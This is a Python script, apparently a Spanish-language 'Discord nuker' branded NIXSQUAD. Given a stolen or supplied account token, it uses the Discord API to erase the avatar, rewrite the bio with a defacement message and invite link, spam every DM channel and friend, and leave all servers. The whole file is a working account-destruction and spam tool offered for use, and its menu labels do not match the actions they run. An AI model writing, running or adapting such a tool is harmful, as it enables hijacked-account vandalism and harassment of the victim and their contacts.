import requests
from colorama import Fore, init
from time import sleep
import os

init()

class DiscordNuker:
    def __init__(self):
        self.token = None
        self.payload = None

    def print_banner(self):
        print(f"""{Fore.RED}
        _   _ _     ______          _             
        | \ | (_)    |  ___|        | |            
        |  \| |___  _| |_ _   _  ___| | _____ _ __ 
        | . ` | \ \/ /  _| | | |/ __| |/ / _ \ '__|
        | |\  | |>  <| | | |_| | (__|   <  __/ |   
        \_| \_/_/_/\_\_|  \__,_|\___|_|\_\___|_|   
                                                   
                                                   
        {Fore.BLUE}w w w . n i x s q u a d . u s{Fore.RESET}
        """)

    def validate_token(self):
        self.token = input(f'{Fore.RED}[+] {Fore.CYAN}Coloca el token para nukear: ')
        print(f'{Fore.GREEN}[*] {Fore.BLUE}Validando token....')
        self.payload = {
            'Authorization': f'{self.token}',
            'Content-Type': 'application/json'
        }
        user = requests.get('https://discord.com/api/v9/users/@me', headers=self.payload)
        if user.status_code == 200:
            self.show_options()
        else:
            self.clear_screen()
            print(f'{Fore.RED}[!] {Fore.BLUE}Token invalido, inicializando otra vez.')
            sleep(1)
            self.run()

    def nuke_account(self):
        print(f'{Fore.RED}[+] {Fore.CYAN}Inicializando la destruccion de la cuenta...')
        guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=self.payload).json()
        requests.patch('https://discord.com/api/v9/users/@me', headers=self.payload, json={'avatar': ''})
        sleep(1)
        requests.patch('https://discord.com/api/v9/users/@me/profile', headers=self.payload, json={
            'bio': "ACCOUNT NUKED BY #NIXSQUAD\n\n https://discord.gg/nixakanazis"
        })
        mds = requests.get('https://discord.com/api/v9/users/@me/channels', headers=self.payload).json()

        for md in mds:
            sleep(0.4)
            msg = requests.post(f'https://discord.com/api/v9/channels/{md["id"]}/messages', headers=self.payload,
                                json={'content': "ACCOUNT NUKED BY NIXSQUAD  https://discord.gg/nixakanazis"})

            for _ in range(3):
                msg = requests.post(f'https://discord.com/api/v9/channels/{md["id"]}/messages', headers=self.payload,
                                    json={'content': "ACCOUNT NUKED BY NIXSQUAD  https://discord.gg/nixakanazis"})

                if msg.status_code == 200:
                    print(f'{Fore.GREEN}[!] {Fore.CYAN}Mensaje enviado con exito a {md["id"]}!')
                else:
                    print(f'{Fore.RED}[!] {Fore.CYAN}Error al enviar mensaje a {md["id"]}')

        print(f'{Fore.GREEN}[!] {Fore.CYAN}Cuenta nukeada con exito!')

    def dm_friends(self):
        print(f'{Fore.RED}[+] {Fore.CYAN}Enviando mensajes a amigos...')
        friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=self.payload).json()
        for friend in friends:
            sleep(0.4)
            friend_id = friend['id']
            msg = requests.post(f'https://discord.com/api/v9/channels/{friend_id}/messages', headers=self.payload,
                            json={'content': "Mensaje a amigos por DM"}) 
            if msg.status_code == 200:
                print(f'{Fore.GREEN}[!] {Fore.CYAN}Mensaje enviado con exito a {friend_id}!')
            else:
                print(f'{Fore.RED}[!] {Fore.CYAN}Error al enviar mensaje a {friend_id}')

    def leave_guilds(self):
        print(f'{Fore.RED}[+] {Fore.CYAN}Saliendo de servidores...')
        guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=self.payload).json()

        for guild in guilds:
            sleep(0.4)
            guild_id = guild['id']
            requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild_id}', headers=self.payload)
            print(f'{Fore.GREEN}[!] {Fore.CYAN}Saliendo de {guild_id}...')

        print(f'{Fore.GREEN}[!] {Fore.CYAN}Saliendo de servidores completado!')

    def change_appearance(self):
        print(f'{Fore.RED}[+] {Fore.CYAN}Cambiando apariencia...')
        requests.patch('https://discord.com/api/v9/users/@me/profile', headers=self.payload, json={
            'bio': "ACCOUNT NUKED BY #NIXSQUAD\n\n https://discord.gg/nixakanazis"
        })

    def automatic_option(self):
        print(f'{Fore.RED}[+] {Fore.CYAN}Ejecutando opción automática...')
        self.nuke_account()
        self.dm_friends()
        self.leave_guilds()
        self.change_appearance()

        print(f'{Fore.GREEN}[!] {Fore.CYAN}Acciones automáticas completadas!')

    def exit_program(self):
        print("Saliendo, gracias por usar la tool")

    def handle_option(self, choice):
        if choice == "1":
            self.clear_screen()
            self.nuke_account()
        elif choice == "2":
            self.clear_screen()
            self.dm_friends()
        elif choice == "3":
            self.clear_screen()
            self.leave_guilds()
        elif choice == "4":
            self.clear_screen()
            self.change_appearance()
        elif choice == "5":
            self.clear_screen()
            self.automatic_option()
        elif choice == "6":
            self.exit_program()

    def show_options(self):
        while True:
            print(f'''
                {Fore.BLUE}[1] - {Fore.GREEN}Automatico  
                {Fore.BLUE}[2] - {Fore.GREEN}DM Friends 
                {Fore.BLUE}[3] - {Fore.GREEN}Leave Guilds  
                {Fore.BLUE}[4] - {Fore.GREEN}Appearence
                {Fore.BLUE}[5] - {Fore.GREEN}Automatico  
                {Fore.BLUE}[6] - {Fore.GREEN}Salir
            ''')
            choice = input(f'{Fore.RED}[?] {Fore.CYAN}Selecciona la opcion para nukear [1/2/3/4/5/6]: ')
            self.clear_screen()
            self.handle_option(choice)

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def run(self):
        self.print_banner()
        self.validate_token()

if __name__ == "__main__":
    DiscordNuker().run()